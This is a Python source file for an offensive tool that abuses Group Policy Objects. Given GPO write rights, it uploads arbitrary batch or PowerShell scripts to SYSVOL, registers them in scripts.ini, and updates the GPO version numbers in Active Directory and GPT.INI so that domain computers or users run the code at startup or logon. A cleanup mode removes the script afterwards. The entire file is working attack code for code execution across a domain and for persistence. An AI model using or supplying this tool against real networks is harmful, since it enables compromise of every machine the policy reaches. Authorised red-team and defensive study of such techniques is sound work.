#!/usr/bin/env python3
"""
gpo_logon_script.py - GPO Logon/Startup Script Abuse Tool

Adds or removes logon/startup scripts from Group Policy Objects via SMB.
Scripts execute when users log on (user scripts) or when computers start (machine scripts).
"""

import argparse
import logging
import re
import sys

from impacket.examples.utils import parse_credentials
from impacket.smbconnection import SMBConnection


# Client-Side Extension GUIDs for scripts
SCRIPTS_CSE = "{42B5FAAE-6536-11D2-AE5A-0000F87571E3}"
SCRIPTS_TOOL = "{40B6664F-4972-11D1-A7CA-0000F87571E3}"

# Event to script type mapping
EVENT_TO_TYPE = {
    "Logon": "user",
    "Logoff": "user",
    "Startup": "machine",
    "Shutdown": "machine",
}


def smb_read_file(smb: SMBConnection, path: str) -> str:
    """Read file from SYSVOL share."""
    try:
        fh = smb.openFile("SYSVOL", path)
        content = smb.readFile("SYSVOL", fh)
        smb.closeFile("SYSVOL", fh)
        return content.decode("utf-8") if content else ""
    except Exception:
        return ""


def smb_write_file(smb: SMBConnection, path: str, content: str):
    """Write file to SYSVOL share, creating directories as needed."""
    parts = path.split("\\")
    for i in range(1, len(parts)):
        try:
            smb.createDirectory("SYSVOL", "\\".join(parts[:i]))
        except Exception:
            pass

    try:
        smb.deleteFile("SYSVOL", path)
    except Exception:
        pass

    # Use putFile instead of openFile/writeFile for simpler write
    from io import BytesIO

    smb.putFile("SYSVOL", path, BytesIO(content.encode("utf-8")).read)


def smb_delete_file(smb: SMBConnection, path: str):
    """Delete file from SYSVOL share."""
    try:
        smb.deleteFile("SYSVOL", path)
    except Exception:
        pass


def update_gpo_version(
    smb: SMBConnection,
    ldap_server: str,
    domain: str,
    username: str,
    password: str,
    gpo_id: str,
    script_type: str,
    increment: int = 1,
):
    """Update GPO version in both AD and SYSVOL (GPT.INI).

    Follows pyGPOAbuse approach exactly:
    1. Read current versionNumber from AD (single source of truth)
    2. Calculate new version based on config type:
       - User config: add 65536 (increment high 16 bits)
       - Computer/Machine config: add 1 (increment low 16 bits)
    3. Write the SAME new version to BOTH AD and GPT.INI
    4. Update extension GUIDs in AD attributes (not GPT.INI)

    Version format:
    - High 16 bits = User Configuration version
    - Low 16 bits = Computer Configuration version
    """
    from ldap3 import Connection, MODIFY_REPLACE, NTLM, Server

    # Build paths and DNs
    domain_dn = ",".join([f"DC={part}" for part in domain.split(".")])
    gpo_dn = f"CN={{{gpo_id}}},CN=Policies,CN=System,{domain_dn}"
    gpo_path = f"{domain}\\Policies\\{{{gpo_id}}}"
    gpt_path = f"{gpo_path}\\GPT.INI"

    # Determine extension attribute name based on config type
    if script_type == "user":
        ext_attr = "gPCUserExtensionNames"
    else:
        ext_attr = "gPCMachineExtensionNames"

    # Connect to LDAP
    server = Server(ldap_server)
    conn = Connection(
        server,
        user=f"{domain}\\{username}",
        password=password,
        authentication=NTLM,
        auto_bind=True,
    )

    # Get current version and extension names from AD
    conn.search(
        gpo_dn,
        "(objectClass=groupPolicyContainer)",
        attributes=["versionNumber", ext_attr],
    )

    if not conn.entries:
        logging.error(f"GPO not found: {gpo_dn}")
        conn.unbind()
        return None

    current_version = int(conn.entries[0].versionNumber.value or 0)

    # Get current extension names
    current_ext = ""
    if hasattr(conn.entries[0], ext_attr) and conn.entries[0][ext_attr].value:
        current_ext = str(conn.entries[0][ext_attr].value)

    # Calculate new version - pyGPOAbuse approach
    # User config: high 16 bits (+65536), Machine config: low 16 bits (+1)
    if script_type == "user":
        version_increment = 65536 * increment
    else:
        version_increment = increment

    new_version = current_version + version_increment
    new_version = max(0, new_version)

    # Build extension GUID string for scripts CSE
    ext_guid = f"[{SCRIPTS_CSE}{SCRIPTS_TOOL}]"

    # Update extension names if needed
    if ext_guid not in current_ext:
        new_ext = current_ext + ext_guid if current_ext else ext_guid
    else:
        new_ext = current_ext

    # Update AD: versionNumber and extension names
    modifications = {"versionNumber": [(MODIFY_REPLACE, [new_version])]}
    if new_ext != current_ext:
        modifications[ext_attr] = [(MODIFY_REPLACE, [new_ext])]

    conn.modify(gpo_dn, modifications)

    if conn.result["result"] == 0:
        logging.info(f"AD versionNumber: {current_version} -> {new_version}")
        print(f"[+] AD version updated: {current_version} -> {new_version}")
        if new_ext != current_ext:
            print(f"[+] AD {ext_attr} updated")
    else:
        logging.error(f"Failed to update AD: {conn.result}")
        print(f"[-] Failed to update AD: {conn.result}")
        conn.unbind()
        return None

    conn.unbind()

    # Update GPT.INI with the SAME version number
    # GPT.INI only contains [General] section with Version - no extension GUIDs
    content = smb_read_file(smb, gpt_path)

    if not content:
        content = f"[General]\r\nVersion={new_version}\r\n"
    else:
        # Update existing version
        if re.search(r"Version=\d+", content, re.IGNORECASE):
            content = re.sub(
                r"Version=\d+", f"Version={new_version}", content, flags=re.IGNORECASE
            )
        else:
            # Add version if not present
            if "[General]" in content:
                content = content.replace(
                    "[General]", f"[General]\r\nVersion={new_version}", 1
                )
            else:
                content = f"[General]\r\nVersion={new_version}\r\n" + content

    smb_write_file(smb, gpt_path, content)
    logging.info(f"GPT.INI version -> {new_version}")
    print(f"[+] GPT.INI version updated -> {new_version}")

    return new_version


def add_script(
    smb: SMBConnection,
    ldap_server: str,
    domain: str,
    username: str,
    password: str,
    gpo_id: str,
    script_name: str,
    script_content: str,
    event: str,
    parameters: str = "",
):
    """Add a logon/startup script to a GPO."""
    script_type = EVENT_TO_TYPE[event]
    gpo_path = f"{domain}\\Policies\\{{{gpo_id}}}"

    if script_type == "machine":
        base = f"{gpo_path}\\Machine\\Scripts"
    else:
        base = f"{gpo_path}\\User\\Scripts"

    script_path = f"{base}\\{event}\\{script_name}"

    is_powershell = script_name.lower().endswith(".ps1")
    ini_filename = "psscripts.ini" if is_powershell else "scripts.ini"
    ini_path = f"{base}\\{ini_filename}"

    smb_write_file(smb, script_path, script_content)
    print(f"[+] Uploaded: {script_path}")

    ini = smb_read_file(smb, ini_path)
    section = f"[{event}]"

    # Initialize ini file if empty
    if not ini:
        ini = f"{section}\r\n"
    elif section not in ini:
        ini = ini.rstrip() + f"\r\n{section}\r\n"
    # Find next index
    indices = re.findall(rf"{re.escape(section)}.*?(\d+)CmdLine", ini, re.DOTALL)
    idx = max([int(i) for i in indices], default=-1) + 1

    # Add entry - use string replacement instead of regex to avoid escaping issues
    entry = f"{idx}CmdLine={script_name}\r\n{idx}Parameters={parameters}\r\n"
    ini = ini.replace(section + "\r\n", section + "\r\n" + entry, 1)
    if section + "\r\n" + entry not in ini:
        # Try without \r
        ini = ini.replace(section + "\n", section + "\n" + entry, 1)

    smb_write_file(smb, ini_path, ini)
    print(f"[+] Updated: {ini_path}")

    # Update both AD and SYSVOL versions together
    update_gpo_version(
        smb, ldap_server, domain, username, password, gpo_id, script_type
    )

    print(f"[+] Added {event.lower()} script: {script_name}")


def remove_script(
    smb: SMBConnection,
    ldap_server: str,
    domain: str,
    username: str,
    password: str,
    gpo_id: str,
    script_name: str,
    event: str,
):
    """Remove a logon/startup script from a GPO."""
    script_type = EVENT_TO_TYPE[event]
    gpo_path = f"{domain}\\Policies\\{{{gpo_id}}}"

    if script_type == "machine":
        base = f"{gpo_path}\\Machine\\Scripts"
    else:
        base = f"{gpo_path}\\User\\Scripts"

    script_path = f"{base}\\{event}\\{script_name}"

    is_powershell = script_name.lower().endswith(".ps1")
    ini_filename = "psscripts.ini" if is_powershell else "scripts.ini"
    ini_path = f"{base}\\{ini_filename}"

    # Delete script file
    smb_delete_file(smb, script_path)
    print(f"[+] Deleted script file: {script_path}")

    # Update scripts.ini - remove entry for this script
    ini = smb_read_file(smb, ini_path)
    if ini:
        new_ini = re.sub(
            rf"\d+CmdLine={re.escape(script_name)}\r?\n\d+Parameters=.*?\r?\n", "", ini
        )
        if new_ini != ini:
            smb_write_file(smb, ini_path, new_ini)
            print(f"[+] Removed entry from: {ini_path}")
        else:
            print(f"[*] No entry found in: {ini_path}")

    # Decrement GPO version in both AD and SYSVOL
    update_gpo_version(
        smb, ldap_server, domain, username, password, gpo_id, script_type, increment=-1
    )
    print(f"[+] Removed {event.lower()} script: {script_name}")


def main():
    parser = argparse.ArgumentParser(
        description="GPO Logon/Startup Script Abuse",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Add user logon script (batch)
  %(prog)s 'domain/user:pass' -dc-ip 10.0.0.1 -gpo-id GUID \\
      -filename evil.bat -content 'whoami > C:\\temp\\out.txt'

  # Add machine startup script (PowerShell)
  %(prog)s 'domain/user:pass' -dc-ip 10.0.0.1 -gpo-id GUID \\
      -filename startup.ps1 -content 'Get-Process | Out-File C:\\temp\\procs.txt' \\
      -event Startup

  # Remove script
  %(prog)s 'domain/user:pass' -dc-ip 10.0.0.1 -gpo-id GUID \\
      -filename evil.bat --cleanup
        """,
    )

    parser.add_argument("target", help="domain/username:password")
    parser.add_argument("-dc-ip", required=True, help="Domain controller IP")
    parser.add_argument("-gpo-id", required=True, help="GPO GUID (without braces)")
    parser.add_argument(
        "-filename", required=True, help="Filename to create (.bat/.ps1)"
    )
    parser.add_argument("-content", help="Script content")
    parser.add_argument(
        "-event",
        choices=["Logon", "Logoff", "Startup", "Shutdown"],
        default="Logon",
        help="Script event (default: Logon)",
    )
    parser.add_argument("-parameters", default="", help="Script parameters")
    parser.add_argument("--cleanup", action="store_true", help="Remove the script")
    parser.add_argument("-v", action="count", default=0, help="Verbosity")

    args = parser.parse_args()

    logging.basicConfig(
        level=[logging.WARNING, logging.INFO, logging.DEBUG][min(args.v, 2)]
    )

    if not args.cleanup and not args.content:
        parser.error("-content required when adding a script")

    domain, username, password = parse_credentials(args.target)
    if not domain:
        print("Error: Domain required in target")
        sys.exit(1)

    try:
        smb = SMBConnection(args.dc_ip, args.dc_ip)
        smb.login(username, password, domain)
    except Exception as e:
        print(f"SMB connection failed: {e}")
        sys.exit(1)

    content = args.content
    if content and content.startswith("@"):
        with open(content[1:], "r") as f:
            content = f.read()

    if args.cleanup:
        remove_script(
            smb,
            args.dc_ip,
            domain,
            username,
            password,
            args.gpo_id,
            args.filename,
            args.event,
        )
    else:
        add_script(
            smb,
            args.dc_ip,  # ldap_server
            domain,
            username,
            password,
            args.gpo_id,
            args.filename,
            content,
            args.event,
            args.parameters,
        )

    smb.close()


if __name__ == "__main__":
    main()
